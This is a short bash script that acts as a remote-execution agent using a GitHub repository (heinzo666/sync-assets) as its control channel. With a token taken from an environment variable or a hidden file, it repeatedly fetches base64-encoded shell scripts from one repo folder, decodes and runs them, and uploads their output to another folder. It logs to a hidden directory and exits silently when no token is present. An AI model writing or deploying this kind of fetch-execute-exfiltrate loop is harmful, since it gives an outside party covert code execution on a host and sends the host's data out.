#!/bin/bash
set -u
T="${GHT:-}"; [ -z "$T" ] && T=$(cat "$HOME/.ghr_tk" 2>/dev/null); [ -z "$T" ] && exit 0
API=https://api.github.com/repos/heinzo666/sync-assets/contents
D="$HOME/.hgw"; mkdir -p "$D"; touch "$D/done"
LOG="$D/log"
{
echo "[$(date -u +%FT%T)] start pid=$$"
LIST=$(timeout 25 curl -fsSL -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' "$API/lab/hgin?ref=main&t=$RANDOM")
NAMES=$(printf '%s' "$LIST" | tr ',' '\n' | grep '"name"' | sed 's/.*"name": *"//; s/".*//' | grep '\.sh$')
echo "list_len=${#LIST} names=[$(echo $NAMES|tr '\n' ' ')]"
for N in $NAMES; do
  grep -qxF "$N" "$D/done" && continue
  J=$(timeout 20 curl -fsSL -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' "$API/lab/hgin/$N?ref=main")
  FLAT=$(printf '%s' "$J" | tr -d ' \t\r\n')
  CLEAN=$(printf '%s' "$FLAT" | sed 's/\\n//g; s/\\r//g; s/\\t//g')
  TMP="${CLEAN#*\"content\":\"}"
  VAL="${TMP%%,*}"
  case "$VAL" in *\"*) VAL="${TMP%%\"*}";; esac
  [ ${#VAL} -lt 16 ] && { echo "EXTRACT_FAIL for $N flat_len=${#FLAT}"; }
  B="$VAL"
  printf '%s' "$B" | base64 -d > "$D/x.sh" 2>"$D/e.txt"
  BSZ=$(wc -c < "$D/x.sh"); BE=$(head -c 60 "$D/e.txt")
  echo "task=$N jlen=${#J} blen=${#B} sz=$BSZ err=[$BE]"
  chmod +x "$D/x.sh"
  OUT=$(/bin/bash "$D/x.sh" 2>&1); RC=$?
  { echo "RC=$RC SZ=$BSZ"; echo "$OUT"; } > "$D/o.txt"
  OB=$(base64 -w0 < "$D/o.txt")
  printf '{"message":"res","content":"%s"}' "$OB" > "$D/p.json"
  PC=$(timeout 22 curl -sS -o /dev/null -w '%{http_code}' -X PUT \
      -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
      --data-binary @"$D/p.json" "$API/lab/hgout/${N%.sh}_$(date +%s)_$$.json")
  echo "put http=$PC outsz=$(wc -c < "$D/o.txt")"
  echo "$N" >> "$D/done"
done
echo "[$(date -u +%FT%T)] end"
} >> "$LOG" 2>&1
exit 0
